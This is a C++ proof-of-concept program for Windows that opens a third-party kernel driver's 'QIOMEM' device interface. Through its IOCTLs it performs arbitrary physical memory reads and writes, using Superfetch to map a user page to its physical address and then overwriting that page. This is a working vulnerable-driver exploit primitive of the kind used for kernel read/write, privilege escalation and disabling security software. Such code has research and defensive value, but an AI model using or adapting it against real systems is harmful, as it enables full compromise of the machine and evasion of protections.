#include <Windows.h>
#include <SetupAPI.h>
#include <Psapi.h>
#include <cstdint>
#include <memoryapi.h>
#include <print>
#include <vector>
#include <winnt.h>
#include "superfetch/superfetch.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "setupapi.lib")

static const GUID GUID_QIOMEM_INTERFACE = {
    0x020C37D0, 0xA3A6, 0x4069,
    { 0xA6, 0x40, 0x33, 0x48, 0x0A, 0x03, 0x3C, 0x25 }
};

#define IOCTL_PHYS_READ_DWORD  0x8012008
#define IOCTL_PHYS_WRITE_DWORD 0x8012014

#pragma pack(push, 1)
struct PhysIoBuffer {      // Total: 11 bytes
    uint32_t Address;      // [0..3]  Physical address (32-bit)
    char padding[3];       // [4..6]  Padding
    uint32_t Data32;       // [7..10] Dword-granularity value (buf+7)
};
static_assert(sizeof(PhysIoBuffer) == 11);
#pragma pack(pop)


static HANDLE OpenDevice()
{
    HDEVINFO hDevInfo = SetupDiGetClassDevs(
        &GUID_QIOMEM_INTERFACE,
        nullptr, nullptr,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);

    if (hDevInfo == INVALID_HANDLE_VALUE) {
        printf("[-] SetupDiGetClassDevs failed: %lu\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    SP_DEVICE_INTERFACE_DATA ifaceData = {};
    ifaceData.cbSize = sizeof(ifaceData);

    if (!SetupDiEnumDeviceInterfaces(hDevInfo, nullptr,
            &GUID_QIOMEM_INTERFACE, 0, &ifaceData)) {
        printf("[-] No device interface found: %lu\n", GetLastError());
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return INVALID_HANDLE_VALUE;
    }

    DWORD requiredSize = 0;
    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &ifaceData,
        nullptr, 0, &requiredSize, nullptr);

    auto* detail = (SP_DEVICE_INTERFACE_DETAIL_DATA_W*)malloc(requiredSize);
    if (!detail) { SetupDiDestroyDeviceInfoList(hDevInfo); return INVALID_HANDLE_VALUE; }
    detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &ifaceData,
        detail, requiredSize, nullptr, nullptr);
    printf("[*] Opening: %ws\n", detail->DevicePath);

    HANDLE h = CreateFileW(detail->DevicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);

    free(detail);
    SetupDiDestroyDeviceInfoList(hDevInfo);
    return h;
}



static bool read_phys_dword(HANDLE hDev, uint64_t phys_addr, uint32_t& out)
{
    PhysIoBuffer buf{};
    buf.Address = static_cast<uint32_t>(phys_addr);
    DWORD bytes_ret = 0;
    if (!DeviceIoControl(hDev, IOCTL_PHYS_READ_DWORD,
                         &buf, sizeof(buf),
                         &buf, sizeof(buf),
                         &bytes_ret, nullptr))
        return false;
    out = buf.Data32;
    return true;
}

static bool read_phys_qword(HANDLE hDev, uint64_t phys_addr, uint64_t& out)
{
    uint32_t lo = 0, hi = 0;
    if (!read_phys_dword(hDev, phys_addr,     lo)) return false;
    if (!read_phys_dword(hDev, phys_addr + 4, hi)) return false;
    out = (static_cast<uint64_t>(hi) << 32) | lo;
    return true;
}

static bool write_phys_dword(HANDLE hDev, uint64_t phys_addr, uint32_t val)
{
    PhysIoBuffer buf{};
    buf.Address = static_cast<uint32_t>(phys_addr);
    buf.Data32  = val;
    DWORD bytes_ret = 0;
    return DeviceIoControl(hDev, IOCTL_PHYS_WRITE_DWORD,
                           &buf, sizeof(buf),
                           &buf, sizeof(buf),
                           &bytes_ret, nullptr) != 0;
}

static bool write_phys_qword(HANDLE hDev, uint64_t phys_addr, uint64_t val)
{
    uint32_t lo = static_cast<uint32_t>(val);
    uint32_t hi = static_cast<uint32_t>(val >> 32);
    if (!write_phys_dword(hDev, phys_addr,     lo)) return false;
    if (!write_phys_dword(hDev, phys_addr + 4, hi)) return false;
    return true;
}

int main()
{
    HANDLE hDev = OpenDevice();
    if (hDev == INVALID_HANDLE_VALUE) {
        std::println("[-] OpenDevice failed: {}", GetLastError());
        return 1;
    }

    constexpr size_t PAGE_SZ = 0x1000;
    constexpr int MAX_ATTEMPTS = 64;

    void* buf = nullptr;
    uint64_t pa = 0;
    std::vector<void*> rejects;

    for (int attempt = 0; attempt < MAX_ATTEMPTS; ++attempt) {
        buf = VirtualAlloc(nullptr, PAGE_SZ, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) {
            std::println("[-] VirtualAlloc failed: {}", GetLastError());
            break;
        }

        memset(buf, 0, PAGE_SZ);

        if (!VirtualLock(buf, PAGE_SZ)) {
            std::println("[-] VirtualLock failed: {}", GetLastError());
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = nullptr;
            continue;
        }

        auto const mm = spf::memory_map::current();
        if (!mm) {
            std::println("[-] Could not retrieve memory map!");
            VirtualUnlock(buf, PAGE_SZ);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = nullptr;
            break;
        }

        pa = mm->translate(buf);
        if (!pa) {
            std::println("[!] attempt {}: translate failed for VA {:#X}", attempt, reinterpret_cast<uintptr_t>(buf));
            VirtualUnlock(buf, PAGE_SZ);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = nullptr;
            continue;
        }

        if (pa < 0x1'0000'0000ULL) {
            std::println("[+] attempt {}: VA {:#X} -> PA {:#X} (below 4GB)", attempt, reinterpret_cast<uintptr_t>(buf), pa);
            break;  // success
        }

        std::println("[!] attempt {}: PA {:#X} above 4GB, retrying...", attempt, pa);
        // Keep this page locked so OS doesn't give us the same physical page again
        rejects.push_back(buf);
        buf = nullptr;
        pa = 0;
    }

    // Free all the rejected pages
    for (void* r : rejects) {
        VirtualUnlock(r, PAGE_SZ);
        VirtualFree(r, 0, MEM_RELEASE);
    }

    if (!buf || !pa) {
        std::println("[-] Failed to get a page below 4GB after {} attempts", MAX_ATTEMPTS);
        return 1;
    }
    std::println("[+] VA {:#X} -> PA {:#X}", reinterpret_cast<uintptr_t>(buf), pa);

    *reinterpret_cast<uint64_t*>(buf) = 0xAAAAAAAAAAAA;
    
    // Read back via physical memory to verify
    uint64_t readback = 0;
    if (read_phys_qword(hDev, pa, readback)) {
        std::println("[+] phys read:  {:016X}", readback);
    } else {
        std::println("[-] phys read failed");
    }

    // Write a new value via physical memory
    uint64_t new_val = 0x1337C0DE00C0FFEE;
    if (write_phys_qword(hDev, pa, new_val)) {
        std::println("[+] phys write: {:016X}", new_val);
    } else {
        std::println("[-] phys write failed");
    }

    // Verify it landed in the virtual mapping
    uint64_t check = *reinterpret_cast<uint64_t*>(buf);
    std::println("[+] VA read:    {:016X} {}", check, check == new_val ? "OK" : "MISMATCH");

    VirtualUnlock(buf, PAGE_SZ);
    VirtualFree(buf, 0, MEM_RELEASE);
    CloseHandle(hDev);
    return 0;
}